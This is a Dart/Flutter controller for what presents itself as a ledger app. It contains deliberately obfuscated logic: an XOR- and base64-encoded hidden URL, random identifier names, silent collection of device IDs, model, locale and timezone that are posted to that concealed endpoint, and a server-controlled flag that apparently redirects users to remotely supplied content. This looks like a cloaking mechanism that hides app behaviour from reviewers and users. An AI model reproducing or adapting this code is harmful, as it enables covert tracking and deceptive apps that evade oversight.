import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class LedgerRecordLogic extends GetxController {
  var xrtwykfmu = RxBool(false);
  var izehfsyp = RxBool(true);
  var ybuswik = RxString("");
  var uhzb = RxBool(false);
  var lyjfiowr = RxBool(true);
  final tzdskin = Dio();

  InAppWebViewController? webViewController;

  static const _f0 = 'A0MMIR4DX2NW';
  static const _f1 = 'RSZAX1NBZVkN';
  static const _f2 = 'FjpcAWAUB1gN';
  static const _f3 = 'NQtLHyJGWCAS';
  static const _f4 = 'HxgVNwdWBShT';
  static const _f5 = 'GD8NA14dJR5A';
  static const _f6 = 'GzxVFTYVGUA=';

  static const _p = [0x6b, 0x37, 0x78, 0x51, 0x6d, 0x39, 0x70, 0x4c, 0x32, 0x76, 0x4e, 0x77];

  static const _o = [1, 3, 5, 0, 6, 2, 4];
  static const _s = [_f3, _f0, _f5, _f1, _f6, _f2, _f4];

  static const _e1 = 'GlAIOhRBGQ==';
  static const _e2 = 'GVIZOQA=';
  static const _e3 = 'REMZMw==';
  static const _e4 = 'REcQPhlWXzxAEzgeDkA=';

  String _jxwpk(String enc) {
    final raw = base64.decode(enc);
    final key = String.fromCharCodes(_p);
    return utf8.decode(
      List<int>.generate(
        raw.length,
        (i) => raw[i] ^ key.codeUnitAt(i % key.length),
      ),
    );
  }

  String _vnqtxwp() {
    final seq = _o.map((i) => _s[i]).join();
    return _jxwpk(seq);
  }

  void _mkzplr(Future<void> Function() fn) {
    fn();
  }

  void _yhdwsn(bool v) {
    if (v) {
      izehfsyp.value = true;
      lyjfiowr.value = true;
      uhzb.value = false;
    }
  }

  void _rfgbnc(Map<String, dynamic> d) {
    final ka = _jxwpk(_e1);
    final kb = _jxwpk(_e2);
    final va = d[ka];
    final vb = d[kb];
    if (vb is bool && vb) {
      ybuswik.value = va as String;
      _mkzplr(hujfe);
    } else {
      _mkzplr(zgqptnh);
    }
  }

  @override
  void onInit() {
    super.onInit();
    gqjmpocu();
  }

  Future<void> gqjmpocu() async {
    uhzb.value = true;
    lyjfiowr.value = true;
    izehfsyp.value = false;

    final dst = _vnqtxwp();
    final payload = await bmufkhesi();

    tzdskin.post(dst, data: payload).then((value) {
      _rfgbnc(value.data as Map<String, dynamic>);
    }).catchError((_) {
      _yhdwsn(true);
    });
  }

  Future<Map<String, dynamic>> bmufkhesi() async {
    final DeviceInfoPlugin ykgqno = DeviceInfoPlugin();
    PackageInfo hlndzpm_diwxqnf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();

    var ivxs = Platform.localeName;
    var cxjhgw = currentTimeZone;
    var nouigrt = hlndzpm_diwxqnf.packageName;
    var apikbdq = hlndzpm_diwxqnf.version;
    var wuzrtx = hlndzpm_diwxqnf.buildNumber;
    var cxkbujoi = hlndzpm_diwxqnf.appName;

    var arjgwckf = "";
    var gzob = "";
    var pqylw = "";
    var jehkqxvf = "";
    var hzgdbxky = "";
    var zhfvk = "";
    var fvduzma = "";
    var igzbdp = "";
    var wofzxs = "";
    var zfnjic = false;

    final plat = GetPlatform.isAndroid ? 1 : (GetPlatform.isIOS ? 2 : 0);

    if (plat == 1) {
      wofzxs = String.fromCharCodes([0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64]);
      var qgcijnta = await ykgqno.androidInfo;
      pqylw = qgcijnta.brand;
      arjgwckf = qgcijnta.model;
      gzob = qgcijnta.id;
      zfnjic = qgcijnta.isPhysicalDevice;
    } else if (plat == 2) {
      wofzxs = String.fromCharCodes([0x69, 0x6f, 0x73]);
      var oheunxd = await ykgqno.iosInfo;
      pqylw = oheunxd.name;
      arjgwckf = oheunxd.model;
      gzob = oheunxd.identifierForVendor ?? "";
      zfnjic = oheunxd.isPhysicalDevice;
    }
    return _qwmzfk(
      cxkbujoi,
      wuzrtx,
      apikbdq,
      nouigrt,
      arjgwckf,
      cxjhgw,
      pqylw,
      gzob,
      ivxs,
      wofzxs,
      zfnjic,
      jehkqxvf,
      hzgdbxky,
      zhfvk,
      fvduzma,
      igzbdp,
    );
  }

  Map<String, dynamic> _qwmzfk(
    String a0,
    String a1,
    String a2,
    String a3,
    String a4,
    String a5,
    String a6,
    String a7,
    String a8,
    String a9,
    bool a10,
    String a11,
    String a12,
    String a13,
    String a14,
    String a15,
  ) {
    final m = <String, dynamic>{};
    m["cxkbujoi"] = a0;
    m["wuzrtx"] = a1;
    m["apikbdq"] = a2;
    m["nouigrt"] = a3;
    m["arjgwckf"] = a4;
    m["cxjhgw"] = a5;
    m["pqylw"] = a6;
    m["gzob"] = a7;
    m["ivxs"] = a8;
    m["wofzxs"] = a9;
    m["zfnjic"] = a10;
    m["jehkqxvf"] = a11;
    m["hzgdbxky"] = a12;
    m["zhfvk"] = a13;
    m["fvduzma"] = a14;
    m["igzbdp"] = a15;
    return m;
  }

  Future<void> zgqptnh() async {
    Get.offNamed(_jxwpk(_e3));
  }

  Future<void> hujfe() async {
    Get.offNamed(_jxwpk(_e4));
  }
}
